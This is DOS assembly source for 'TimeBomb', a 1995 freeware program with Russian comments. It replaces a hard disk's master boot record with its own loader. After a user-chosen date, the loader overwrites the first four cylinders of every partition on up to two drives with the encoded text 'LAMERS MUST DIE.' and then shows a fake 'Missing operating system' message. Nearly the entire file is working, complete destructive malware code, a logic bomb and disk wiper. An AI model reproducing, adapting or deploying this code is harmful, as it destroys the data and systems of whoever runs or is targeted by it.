;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; (C)  ANS  (Armourer)		   TimeBomb    Ver 1.00			25 Jun
; FIDOnet 2:461/29.444		   FreeWare, SourceWare			 1995
;
;
; Полностью заменяет MBR. По достижении определенной даты фатально грохает винт
;
; Старый MBR записывается в файл c:\mbr.bak, чтобы можно было восстановить,
; если что. Управления старый MBR не получает, так что если он делал что-то
; более умное, нежели загрузка системы с активного раздела - TimeBomb придется
; переделать.
;
; При срабатывании TimeBomb затираются первые 4 цилиндра каждого раздела на
; винте, включая логические диски DOS (extended partition)
;
; Следует заметить, что Non-DOS разделы (HPFS, например) при этом пострадают
; незначительно - в связи с коренным отличием их структуры от DOS FAT.
;
killed_cyl	= 4	; Число убиваемых цилиндров в каждом разделе
xor_value	= 73h	; Значение зашифрования Вашего последнего слова ;-)

	locals
cseg	segment
	assume	cs:cseg
	org	100h
	.286
start	proc	near
;
; Инсталляция
;
	; Проверяем командную строку
	mov	si, 80h
	mov	bl, byte ptr [si]
	xor	bh, bh
	cmp	bl, 8
	jnc	@@checkdate


help:
	; В командной строке не указана дата - выводим подсказку
	mov	dx, offset @@title
	mov	ah, 9
	int	21h
	int	20h


	; Получение BCD-числа из ком. строки
getBCD		proc	near
	dec	si
	mov	ax, word ptr [si+bx]	; Берем последние две цифры
	sub	ax, '00'		; ASCII -> BIN
	xchg	al, ah
	db	0d5h, 10h		; AAD с модификатором 16
	cmp	al, 9ah
	jnc	help
	dec	si			; Сразу переходим к следующему полю
	dec	si
	retn
getBCD		endp


@@checkdate:	; Проверяем дату (сначала год, затем месяц, затем число)
		; и приводим ее к нужному формату
	; Корректность даты не проверяем - жто проблема пользователя -
	; что он там ввел
	call	getBCD			; Берем цифры года
	mov	byte ptr year, al	; Получили BCD-year
	cmp	byte ptr [bx+si+1], '.'	; Проверяем разделитель
	jne	help
	call	getBCD			; Берем цифры месяца
	mov	byte ptr month, al	; Получили BCD-month
	cmp	byte ptr [bx+si+1], '.'	; Проверяем разделитель
	jne	help
	call	getBCD			; Берем цифры дня
	mov	byte ptr day, al	; Получили BCD-day


@@singledisk:
;
; Заменяем MBR винта своим кодом из bomb proc
;
; Читаем старый MBR, сохраняем его в c:\mbr.bak, пишем себя	
;
	; Читаем MBR
	mov	cx, 1
	mov	dx, 80h
	mov	ax, 201h
	mov	bx, offset buffer
	int	13h
	jnc	@@rd_ok

	mov	dx, offset @@rd_err

@@err_exit:	; Вывод сообщения из DX и вылет по ошибке
	mov	ah, 9
	int	21h
	retn

@@rd_ok:
	; Создаем файл
	mov	dx, offset @@fname
	xor	cx, cx
	mov	ah, 3ch
	int	21h
	jnc	@@cr_ok

	mov	dx, offset @@cr_err
	jmp	@@err_exit

@@cr_ok:
	; Пишем в файл
	mov	bx, ax
	mov	cx, 512
	mov	dx, offset buffer
	mov	ah, 40h
	int	21h
	jnc	@@wr_ok

	mov	dx, offset @@wr_err
	jmp	@@err_exit

@@wr_ok:
	; Закрываем файл
	mov	ah, 3eh
	int	21h

;
; Переносим свой MBR на место старого
;
	mov	si, offset bomb
	mov	di, offset buffer
	mov	bx, di
	mov	cx, di
	sub	cx, si
	cld
	rep	movsb

;
; Записываем новый MBR поверх старого
;
	mov	cx, 1
	mov	dx, 80h
	mov	ax, 301h
	int	13h

	mov	dx, offset @@mbr_wr_err
	jc	@@err_exit

	mov	dx, offset @@done_msg
	jmp	@@err_exit


	; Сообщения об ошибках
@@rd_err:	db	'Error read the MBR of C:',13,10,'$'	
@@cr_err:	db	'Error creating the '
@@fname:	db	'C:\MBR.BAK',0,'file',13,10,'$'
@@wr_err:	db	'Error writing backup file',13,10,'$'
@@mbr_wr_err:	db	'Error writing new MBR',13,10,'$'
@@done_msg:	db	'Your MBR replaced by TimeBomb',13,10,'$'


	; Заставка
@@title:
db	13,10,10
db	'(C) Armourer    TimeBomb	Ver 1.00	25 Jun 1995',13,10,10
db	'	Usage:	timebomb <date>',13,10,10
db	'	Where <date> is a fatal date for your computer.',13,10
db	'	Date format must be in exUSSR standard:    DD.MM.YY',13,10,10
db	'Good Luck ;)',13,10,'$'

start	endp



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Текст бомбы. Комбинируется с MBR (от MBR берется партишн)
;
; Этот код будет стартовать с адреса 0:7c00h
;
bomb	proc	near

	; Настраиваем стек и переносим MBR, куда надо (0:600h)
	cli
	mov	ax, cs
	mov	ss, ax
	mov	ds, ax
	mov	es, ax
	mov	si, 7c00h
	mov	sp, si
	push	si		; Это нужно для последующего старта boot'а
	cld
	mov	cx, 1beh / 2	; После такого переноса SI будет указывать
	mov	di, 600h	; на партишн
	rep	movsw

	push	ax					; Сегмент
	push	offset beginbomb - offset bomb + 600h	; Смещение
	retf


beginbomb:
	; Проверяем время
	mov	ah, 4
	int	1ah		; Прочли дату в CX:DX
	jc	@@skipbomb	; Если часы не работают -> пропускаем проверку

year	= $ + 2
	cmp	cl, 12h		; Проверяем год
	jc	@@skipbomb	; Год не совпал ;)
	jne	@@explode	; Если этот год прошел - взрываемся нмедленно

month	= $ + 3
day	= $ + 2
	cmp	dx, 1234h	; Именно так, чтобы не сгенерировался
				; короткий вариант для CMP
	jc	@@skipbomb	; Не совпал день и месяц


@@explode:
	;
	; Все совпало, пришла черная пора...
	;
	; Стираем первые цилиндры каждого раздела (включая логические
	; диски DOS)
	;
	; Устанавливаем в коде бомбы параметры винта
	mov	dl, 80h
	call	destroy

	; Устанавливаем параметры аторого винта, если он есть
	ror	dl, 1		; Если один диск, флаг CF будет установлен
	jc	@@singledisk

	mov	dl, 81h
	call	destroy

@@singledisk:
	jmp	@@incorrect	; Выводим сообщение "Missing operating ssytem"


@@skipbomb:
;
; Отработка нормального кода MBR
;
	; Ищем загрузочный раздел
	mov	cl, 4			; Есть всего 4 варианта ...

@@searchboot:		; Цикл поиска
	mov	dx, word ptr [si]	; Сразу загружаем в DX то, что нужно
	cmp	dl, 80h			; Этот раздел загрузочный ?
	je	@@boot

	add	si, 10h			; Переходим к следующей записи
	loop	@@searchboot

	; Не нашли - выдаем сообщение
@@incorrect:
	call	errmsg
	db	'Missing operating system',0


@@boot:			; Загружаем boot-сектор и передаем ему управление
	mov	cx, word ptr [si+2]	; Что надо - в CX
	mov	ax, 201h		; Читаем 1 сектор
	pop	bx			; По адресу 0:7c00h
	push	bx
	int	13h
	jnc	@@exit

	call	errmsg
	db	'Error reading operating system',0

@@exit:
	cmp	word ptr [bx + 510], 0aa55h
	jne	@@incorrect
	retn				; Запускаем boot

;
;	Подпрограммы
;

	; Выдача сообщения об ошибке
errmsg		proc	near
	sti
	cld
	pop	si
	mov	ah, 0eh
@@nextchar:	
	lodsb
	or	al, al
	je	$
	int	10h
	jmp	@@nextchar
errmsg		endp


	; Обход всех разделов диска с записью их параметров в буфер
getpart		proc	near
	; Это рекурсивная функция.
	; На входе в SI требуется указатель на очередной раздел
	; В буфер по адресу ES:DI пишутся параметры тек.раздела

	mov	cx, 4		; Счетчик разделов в каждом MBR

@@nextpart:
	; Проверяем тип раздела
	cmp	byte ptr [si+4], 0	; Неиспользуемый раздел
	je	@@exit

	; Пишем в буфер параметры раздела
	mov	ax, word ptr [si]	; Голова
	stosw
	mov	dx, ax			; Готовимся ко входу в рекурсию

disk1	= $ + 1
	mov	dl, 80h			; Номер обрабатываемого диска

	mov	ax, word ptr [si+2]
	stosw				; Цилиндр/сектор

	; Снова проверяем тип раздела - не расширенный ли он ?
	cmp	byte ptr [si+4], 5
	jne	@@exit			; Нет - идем дальше

	; Ныряем в рекурсию
	; Читаем MBR расширенного раздела
	push	cx			; Сохраняем счетчик
	push	si			; Сохраняем указатель на разделы
	add	bx, 512			; Продвигаем указатель на буфер
	mov	cx, ax			; Сейчас CX:DX указывают на MBR
	mov	ax, 201h		; расширенного раздела
	int	13h			; Читаем расширенный раздел в 0:BX
	jnc	@@rec			; Проверка на корректность

	; Выходим из рекурсии в случае сбоя
	pop	si
	pop	cx
	sub	bx, 512
	jmp	@@exit

@@rec:
	mov	si, bx			; Устанавливаем указатель
	add	si, 1beh		; на таблицу разделов
	call	getpart


@@exit:
	add	si, 10h
	loop	@@nextpart

	; Выход из рекурсии
	sub	bx, 512
	pop	dx
	pop	si
	pop	cx
	push	dx
	retn

getpart		endp


	; Уничтожение содержимого текущего диска
destroy		proc	near

	; Получаем параметры винта, указанного в DL
	mov	byte ptr ds:[offset disk - offset bomb + 600h], dl
	mov	byte ptr ds:[offset disk1 - offset bomb + 600h], dl
	mov	ah, 8
	int	13h
	mov	byte ptr ds:[heads - offset bomb + 600h], dh
	and	cl, 63
	mov	byte ptr ds:[sectors - offset bomb + 600h], cl
	push	dx

	mov	bx, 0a00h	; Буфер для чтения MBR расширенных разделов
				; По ходу дела к BX будет прибавляться по 512 -
				; так что максимальный уровень вложенности
				; составит 57 разделов
	mov	di, 500h	; Буфер под параметры для int 13h (64 диска)

	; Рекурсивно обходим логические диски, записывая в буфер параметры
	; для int 13h
	push	si		; Корректный вход в рекурсию
	push	cx

	xor	ax, ax		; Установка для стирания главного MBR
	stosw
	inc	ax
	stosw

	call	getpart		; Обход разделов


	; Создаем значение прописывания
	; Сейчас в bx лежит длина прописываемых данных в параграфах - 800h
	push	di	; Сохраняем указатель на хвост списка параметров
	mov	di, bx	; В DI будет указатель на буфер для данных
	shl	di, 4	; Буфер будет располагаться со смещения 8000h
	push	di	; Сохраняем адрес буфера заполнения

@@nextword:
	mov	si, offset lmd - offset bomb + 600h
	mov	cx, 16
@@nextchar:
	lodsb
	xor	al, xor_value
	stosb
	loop	@@nextchar
	dec	bx
	jne	@@nextword


	; Идем назад по буферу
	pop	bx		; Восстанавливаем адрес буфера
	pop	si		; Восстанавливаем указатель на параметры
	mov	cx, si		; Вычисляем число затираемых разделов
	sub	cx, 500h
	shr	cx, 2

	std
	lodsw			; Переходим к последней записи в буфере


@@nextpart:
	push	cx		; Сохраняем счетчик

	lodsw			; Берем параметры раздела
	mov	cx, ax		; Цилиндр/сектор
	lodsw
	mov	dx, ax		; Голова

disk	= $ + 1
	mov	dl, 80h		; Номер затираемого диска

	mov	si, killed_cyl	; Счетчик убиваемых цилиндров

	; Прописываем раздел
@@nexthead:
sectors	= $ + 1
	mov	ax, 310h	; !!!!
	int	13h
	inc	dh		; Следующая голова

heads	= $ + 2
	cmp	dh, 16		; Весь цилиндр ?
	jne	@@nexthead

	add	cx, 64		; Следующий цилиндр
	xor	dh, dh		; Начинаем с нулевой головы
	dec	si
	jne	@@nexthead

	pop	cx		; Восстанавливаем счетчик
	loop	@@nextpart	; и крутим цикл по разделам

	pop	dx
	retn
destroy		endp


lmd:
	irpc	ch, <LAMERS MUST DIE.>
		db	'&ch' xor xor_value
	endm

bomb	endp


buffer:			; Сюда будем читать старый mbr
	dw	offset buffer - offset bomb
cseg	ends
end	start
